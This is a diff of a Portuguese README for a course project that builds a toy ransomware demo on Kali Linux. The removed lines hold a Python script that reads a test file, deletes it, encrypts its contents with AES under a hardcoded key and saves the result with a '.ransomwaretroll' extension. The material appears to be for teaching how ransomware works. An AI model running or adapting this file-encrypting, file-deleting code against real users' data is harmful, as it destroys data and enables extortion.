@@ -10,40 +10,9 @@ Projeto criado para curso da DIO utilizando o a distribuição Kali linux.
 5. Criar um diretorio: "mkdir projeto_ransowre"
 6. Criar o arquivo descripto.py com o comando:"nano descripto.py"
 7. digitar o codigo em python:
-
-
 ![capturadetela](/ProjetoDois/decripto.png)
- 
 8. Criar o arquivo encripta. py com o seghunte código:
-
-import os
-import pyaes
-
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
-
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
-
-![capturadetela](/ProjetoDois/encripto.png))
+[capturadetela](/ProjetoDois/encripto.png))
 9.  Salvar o arquivo com o ctrl + O e encerrar o arquivo com o comando ctrl + x
-
-
 10. Testar
 
